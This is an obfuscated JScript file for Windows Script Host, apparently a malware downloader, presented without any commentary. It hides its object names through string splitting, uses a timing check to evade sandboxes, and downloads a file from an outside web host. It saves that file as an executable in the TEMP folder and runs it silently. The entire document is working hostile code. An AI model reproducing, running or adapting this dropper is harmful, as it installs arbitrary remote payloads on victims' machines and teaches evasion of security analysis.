var PC = false;
var RA = "Create"+"Object";
var PN = function UV() {return WScript[RA]("WScript"+".Shell");}(), Y = 11;
var TX = "MSXML2"+".XMLHTTP";
var X0 = 2;
var K = X0 - 2;
function QE(UN){PN["Run"](UN, K, K);};
function U(){return TX + "";};
function I(PE, E){K = K * 1; return PE - E;};
function U0(){return RA;};
/*@cc_on
  @if (@_win32 || @_win64)
    PC = true;
  @end
@*/
if (PC)
{
var D = "";
function W(){return 22;};
var H = 0; var A = 0;
function VK()
{
var D0 = new this["Date"]();
var XE = D0["getUTCMilliseconds"]();
WScript["Sleep"](W());
var D0 = new this["Date"]();
var F = D0["getUTCMilliseconds"]();
WScript["Sleep"](W());
var D0 = new this["Date"]();
var J0 = D0["getUTCMilliseconds"]();
var H = "MW";
H = I(F, XE);
var A = "K0";
A = I(J0, F);
D = "open";
return I(H, A);
}
var L0 = false;
var YM = false;
for (var FT = K; FT < W() * 1; FT++){if (VK() != K){
L0 = true; 
A = "31" + 11 * H + A; 
YM = true; 
break;
}}
function GV() {return ((L0 == true) && (L0 == YM)) ? 1 : K;};
if (L0 && GV() && YM){
function ZR() {return PN["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "SQvzlbD4n.ex" + "e";};
 C = U();
 I0 = WScript[RA](C);
 var L = 1;
do { 
	for (;L;){
	try {
		if (L == 1)
		{
			I0[D]("GET", "http://aaacollectionsjewelry.com/x9djsa", false);
			I0["send"]();
			X = "Sleep";
			L = 2;
		}
		WScript[X](W() + 120); 
		if (I0["readystate"] < 2 * 2) continue;
		L = K;
		function OP(J) {var GO = (1, 2, 3, 4, 5, J); return GO;};
		A0 = WScript[U0()]("ADODB.Stream");
		C = A0;
		C[D]();
		C["type"] = OP(1);
		C["write"](I0["ResponseBody"]);
		A0["position"] = OP(K);
		C["Save" + "ToFile"](ZR(), 2);
		A0["cl"+"ose"]();
		W0 = ZR();
		QE(W0);
	} catch(B){};};
}while (L);
}
}

